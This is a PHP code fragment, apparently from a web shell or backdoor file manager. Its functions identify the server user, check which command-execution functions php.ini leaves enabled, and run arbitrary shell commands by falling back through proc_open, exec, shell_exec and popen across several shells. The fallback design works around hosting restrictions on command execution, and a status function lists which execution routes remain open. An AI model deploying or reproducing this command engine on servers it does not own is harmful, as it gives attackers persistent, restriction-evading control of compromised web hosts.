function fum_detect_user() {
    $u = '';
    if (function_exists('get_current_user')) $u = @get_current_user();
    if ($u == '' || $u == 'root') { $e = getenv('USER'); if ($e) $u = $e; }
    if (($u == '' || $u == 'root') && isset($_ENV['USER']) && $_ENV['USER']) $u = $_ENV['USER'];
    if (($u == '' || $u == 'root') && isset($_SERVER['USER']) && $_SERVER['USER']) $u = $_SERVER['USER'];
    if (($u == '' || $u == 'root') && function_exists('posix_getpwuid') && function_exists('posix_geteuid')) {
        $info = @posix_getpwuid(@posix_geteuid());
        if (is_array($info) && isset($info['name'])) $u = $info['name'];
    }
    return $u;
}

function fum_disabled($fn) {
    $df = strtolower(ini_get('disable_functions'));
    if ($df == '') return false;
    $parts = preg_split('/\s*,\s*/', $df);
    for ($i = 0; $i < count($parts); $i++) {
        if ($parts[$i] == strtolower($fn)) return true;
    }
    return false;
}

function fum_fn_ok($fn) {
    if (!function_exists($fn)) return false;
    if (fum_disabled($fn)) return false;
    if (strtolower(ini_get('safe_mode')) == 'on' || ini_get('safe_mode') == '1') return false;
    return true;
}

/* ---------- runCmd: proc_open(env) -> exec -> shell_exec -> popen ----------
   v66.2 SHELL-AGNOSTIC + FALLBACK: shell dari gsp_sh_bin(); bila output/exit
   mengindikasikan shell-nya sendiri hilang ('not found'/127) -> coba kandidat
   berikutnya (bash -> sh -> dash) sebelum menyerah. */
function fum_run_cmd($cmd) {
    /* hook UJI (jangan dipakai produksi): GSP_NOEXEC truthy -> tanpa spawn,
       seluruh jalur exec diloncati (selaras gate run_stream) */
    $gsp_noexec = getenv('GSP_NOEXEC');
    if (is_string($gsp_noexec) && $gsp_noexec !== '' && $gsp_noexec !== '0') return array(null, 'noexec');
    $out = null;
    $via = '';
    $user = fum_detect_user();
    $home = getenv('HOME');
    if (!$home) $home = '/home/' . $user;
    $envStr = 'HOME=' . $home . ' USER=' . $user;
    $bins = gsp_sh_candidates();
    $nb = count($bins);
    for ($bi = 0; $bi < $nb; $bi++) {
        $bin = $bins[$bi];
        $fullCmd = $envStr . ' ' . $bin . gsp_sh_login_flag($bin) . ' -c ' . escapeshellarg($cmd) . ' 2>&1';
        $out = null;
        $gone = false;

        // 1) proc_open dengan env + cwd home (paling stabil)
        if (fum_fn_ok('proc_open')) {
            $desc = array(0 => array('pipe', 'r'), 1 => array('pipe', 'w'), 2 => array('pipe', 'w'));
            $envArr = array(
                'HOME' => $home,
                'USER' => $user,
                'PATH' => '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'
            );
            $proc = @proc_open($bin . gsp_sh_login_flag($bin) . ' -c ' . escapeshellarg($cmd), $desc, $pipes, $home, $envArr);
            if (is_resource($proc)) {
                if (isset($pipes[0]) && is_resource($pipes[0])) @fclose($pipes[0]);
                $o = '';
                $e = '';
                if (isset($pipes[1]) && is_resource($pipes[1])) { $o = gsfu_stream_read($pipes[1]); @fclose($pipes[1]); }
                if (isset($pipes[2]) && is_resource($pipes[2])) { $e = gsfu_stream_read($pipes[2]); @fclose($pipes[2]); }
                $rc = @proc_close($proc);
                if (trim(strval($o)) == '' && trim(strval($e)) != '') $o = $e;
                if (trim(strval($o)) != '') {
                    if (gsp_sh_gone($o, is_int($rc) ? $rc : -1)) $gone = true;
                    else { $out = $o; $via = 'proc_open'; }
                }
            }
        }
        // 2) exec
        if ($out === null && !$gone && fum_fn_ok('exec')) {
            $arr = array(); $ret = 1;
            @exec($fullCmd, $arr, $ret);
            $o = implode("\n", $arr);
            if (trim($o) != '') {
                if (gsp_sh_gone($o, $ret)) $gone = true;
                else { $out = $o; $via = 'exec'; }
            } elseif ($ret === 127) $gone = true;
        }
        // 3) shell_exec
        if ($out === null && !$gone && fum_fn_ok('shell_exec')) {
            $o = @shell_exec($fullCmd);
            if ($o !== null && trim($o) != '') {
                if (gsp_sh_gone($o, -1)) $gone = true;
                else { $out = $o; $via = 'shell_exec'; }
            }
        }
        // 4) popen
        if ($out === null && !$gone && fum_fn_ok('popen')) {
            $fp = @popen($fullCmd, 'r');
            if ($fp) {
                $o = '';
                while (!feof($fp)) $o .= fread($fp, 8192);
                @pclose($fp);
                if (trim($o) != '') {
                    if (gsp_sh_gone($o, -1)) $gone = true;
                    else { $out = $o; $via = 'popen'; }
                }
            }
        }
        if ($out !== null) { if ($bi > 0) $via .= '(fb:' . basename(preg_replace('/ sh$/', '', $bin)) . ')'; break; }
        /* shell hilang -> kandidat berikutnya; output jelek tidak diteruskan */
    }
    return array($out, $via);
}

function fum_shell_status() {
    $fns = array('proc_open', 'exec', 'shell_exec', 'popen', 'system', 'passthru');
    $out = array();
    foreach ($fns as $f) $out[] = $f . ':' . (fum_fn_ok($f) ? 'OK' : 'x');
    return implode(' ', $out);
}

